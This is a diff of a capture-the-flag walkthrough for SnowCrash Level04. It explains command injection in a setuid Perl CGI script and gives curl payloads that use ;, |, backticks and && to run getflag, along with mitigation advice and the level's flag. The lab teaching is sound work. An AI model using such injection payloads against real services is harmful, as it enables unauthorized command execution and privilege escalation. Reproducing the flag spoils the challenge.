@@ -1,6 +1,7 @@
 # SnowCrash Level04 Walkthrough
 
 ## Overview
+
 Level04 demonstrates a classic web application vulnerability: **command injection** through a Perl CGI script. This level shows how unsanitized user input can lead to arbitrary command execution on the server.
 
 ## Initial Investigation
@@ -19,6 +20,7 @@ d--x--x--x  1 root    users     340 Aug 30  2015 ..
 ```
 
 ### Key Observations
+
 - The `level04.pl` script has **setuid** and **setgid** bits set (`-rwsr-sr-x`)
 - It's owned by `flag04` user, meaning it runs with flag04 privileges
 - The file is a Perl script (`.pl` extension)
@@ -53,11 +55,13 @@ x(param("x"));
 ### Vulnerability Analysis
 
 The critical vulnerability lies in this line:
+
 ```perl
 print `echo $y 2>&1`;
 ```
 
 This code:
+
 - Uses backticks to execute shell commands
 - Directly interpolates user input (`$y`) into the command
 - Provides no input sanitization or validation
@@ -77,6 +81,7 @@ The service is indeed listening on localhost port 4747.
 ## Exploitation Strategy
 
 The attack vector involves:
+
 1. **Command Injection**: Using command substitution syntax `$(command)` in the URL parameter
 2. **Privilege Escalation**: Leveraging the setuid bit to execute commands as flag04
 3. **Flag Retrieval**: Executing `getflag` with elevated privileges
@@ -95,6 +100,7 @@ level04.pl
 ### Step 2: Understanding the Injection Mechanism
 
 The injection works because:
+
 1. Our input `$(ls)` is passed as parameter `x`
 2. The script assigns it to variable `$y`
 3. The command becomes: `echo $(ls) 2>&1`
@@ -120,11 +126,13 @@ curl 'http://localhost:4747?x=;getflag'
 ``` -->
 
 ### Using Pipe Operators
+
 ```bash
 curl 'http://localhost:4747?x=|getflag'
 ```
 
 ### Using Backticks
+
 ```bash
 curl 'http://localhost:4747?x=`getflag`'
 ```
@@ -139,15 +147,18 @@ curl 'http://localhost:4747?x=&&getflag'
 This level demonstrates several critical security vulnerabilities:
 
 ### 1. **Command Injection**
+
 - Direct execution of user input without sanitization
 - Use of dangerous functions like backticks in Perl
 - No input validation or filtering
 
 ### 2. **Privilege Escalation**
+
 - Setuid binary allowing execution with elevated privileges
 - Web service running with unnecessary permissions
 
 ### 3. **Poor Input Handling**
+
 - No escaping or sanitization of user input
 - Direct interpolation of variables into shell commands
 
@@ -162,9 +173,10 @@ To prevent such vulnerabilities:
 5. **Use Safe Functions**: Prefer functions that don't invoke shell interpreters
 
 ### Example of Secure Code
+
 ```perl
 # Instead of: print `echo $y 2>&1`;
-# Use: 
+# Use:
 if ($y =~ /^[a-zA-Z0-9\s]+$/) {  # Validate input
     print CGI::escapeHTML($y);    # Escape output
 }
@@ -173,11 +185,13 @@ if ($y =~ /^[a-zA-Z0-9\s]+$/) {  # Validate input
 ## Web Application Context
 
 This level simulates a common real-world scenario where:
+
 - Web applications accept user input through URL parameters
 - Backend scripts process this input without proper validation
 - Elevated privileges amplify the impact of vulnerabilities
 
 ## Flag
+
 ```
 ne2searoevaevoem4ov4ar8ap
 ```
